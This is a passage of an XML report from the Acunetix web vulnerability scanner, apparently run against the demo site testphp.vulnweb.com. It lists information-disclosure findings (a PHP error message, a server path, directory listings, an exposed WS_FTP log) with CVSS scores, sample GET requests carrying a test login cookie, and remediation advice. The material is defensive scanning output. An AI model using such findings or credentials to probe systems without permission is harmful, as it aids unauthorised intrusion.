          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="107" color="orange">
       <Name><![CDATA[Error message on page]]></Name>
       <ModuleName><![CDATA[Scripting (Text_Search_File.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;b&gt;Warning&lt;/b&gt;:  Sablotron error on line 1: XML parser error 3: no element found in &lt;b&gt;/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/xsltTransform.class.php&lt;/b&gt; on line &lt;b&gt;70&lt;/b&gt;&lt;br /&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/pictures/path-disclosure-unix.html]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[The error messages may disclose sensitive information. This information can be used to launch further attacks.]]></Impact>
       <Description><![CDATA[This page contains an error/warning message that may disclose sensitive information. The message can also contain the location of the file that produced the unhandled exception.<br/><br/>
This may be a false positive if the error message is found in documentation pages.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Review the source code for this script.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /pictures/path-disclosure-unix.html HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/pictures/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:11 GMT
Content-Type: text/html
Last-Modified: Mon, 08 Apr 2013 08:42:10 GMT
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 3936
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="108" color="green">
       <Name><![CDATA[Possible server path disclosure (Unix)]]></Name>
       <ModuleName><![CDATA[Scripting (Text_Search_File.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">/usr/local/etc/httpd/htdocs2/destination</font></pre>]]></Details>
       <Affects><![CDATA[/pictures/path-disclosure-unix.html]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Possible sensitive information disclosure.]]></Impact>
       <Description><![CDATA[One or more fully qualified path names were found on this page. From this information the attacker may learn the file system structure from the web server. This information can be used to conduct further attacks.<br/><br/> <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div>]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Prevent this information from being displayed to the user.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /pictures/path-disclosure-unix.html HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/pictures/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:11 GMT
Content-Type: text/html
Last-Modified: Mon, 08 Apr 2013 08:42:10 GMT
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 3936
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Full Path Disclosure]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/Full_Path_Disclosure]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="109" color="orange">
       <Name><![CDATA[Directory listing]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Listing.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;title&gt;Index of /pictures/&lt;/title&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/pictures]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Information]]></Type>
       <Impact><![CDATA[A user can view a list of all files from this directory possibly exposing sensitive information.]]></Impact>
       <Description><![CDATA[The web server is configured to display the list of files contained in this directory. This is not recommended because the directory may contain files that are not normally exposed through links on the web site.]]></Description>
       <DetailedInformation><![CDATA[<h2>How to disable directory listings</h2> <ul> <li>The easiest way to disable directory listing is to create an index file. The name of the index file depends on the web server configuration. On Apache is called index.htm, index.html. On IIS is named default.asp, default.aspx, default.htm.</li> <li>On IIS directory listings are disabled by default.</li> <li>For Apache you need to edit the Apache configuration file (usually named httpd.conf) or create an .htaccess file. In the configuration file you will have the definition of the directory. Something like   <pre wrap="virtual"><code>&lt;Directory  /directoryname/subdirectory&gt; Options Indexes FollowSymLinks ... &lt;/Directory&gt;</code></pre> To disable directory listing for that directory you need to remove the 'Indexes' option. </li> </ul>]]></DetailedInformation>
       <Recommendation><![CDATA[You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /pictures/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/pictures/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:10 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 2685
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Directory Listing and Information Disclosure]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/directory-listing-information-disclosure/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="110" color="orange">
       <Name><![CDATA[WS_FTP log file found]]></Name>
       <ModuleName><![CDATA[Scripting (WS_FTP_log_file.script)]]></ModuleName>
       <Details><![CDATA[Pattern found: <pre wrap="virtual"><font color="blue">103.05.06 13:17 </font></pre>]]></Details>
       <Affects><![CDATA[/pictures//WS_FTP.LOG]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[This file may expose sensitive information that may help an malicious user to prepare more advanced attacks.]]></Impact>
       <Description><![CDATA[WS_FTP is a popular FTP client. This application creates a log file named WS_FTP.LOG. This file contains sensitive
data such as file source/destination and file name, date/time of upload etc.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove this file from your website or change its permissions to remove access.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /pictures//WS_FTP.LOG HTTP/1.1
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:28:10 GMT
Content-Type: text/plain
Content-Length: 771
Last-Modified: Fri, 23 Jan 2009 10:06:53 GMT
Connection: keep-alive
ETag: &quot;497996bd-303&quot;
Accept-Ranges: bytes
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[ws_ftp.log]]></Database>
          <URL><![CDATA[http://archives.neohapsis.com/archives/fulldisclosure/2004-08/0663.html]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="111" color="orange">
       <Name><![CDATA[Directory listing]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Listing.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;title&gt;Index of /_mmServerScripts/&lt;/title&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/_mmServerScripts]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Information]]></Type>
       <Impact><![CDATA[A user can view a list of all files from this directory possibly exposing sensitive information.]]></Impact>
       <Description><![CDATA[The web server is configured to display the list of files contained in this directory. This is not recommended because the directory may contain files that are not normally exposed through links on the web site.]]></Description>
       <DetailedInformation><![CDATA[<h2>How to disable directory listings</h2> <ul> <li>The easiest way to disable directory listing is to create an index file. The name of the index file depends on the web server configuration. On Apache is called index.htm, index.html. On IIS is named default.asp, default.aspx, default.htm.</li> <li>On IIS directory listings are disabled by default.</li> <li>For Apache you need to edit the Apache configuration file (usually named httpd.conf) or create an .htaccess file. In the configuration file you will have the definition of the directory. Something like   <pre wrap="virtual"><code>&lt;Directory  /directoryname/subdirectory&gt; Options Indexes FollowSymLinks ... &lt;/Directory&gt;</code></pre> To disable directory listing for that directory you need to remove the 'Indexes' option. </li> </ul>]]></DetailedInformation>
       <Recommendation><![CDATA[You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /_mmServerScripts/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/_mmServerScripts/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:10 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 416
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
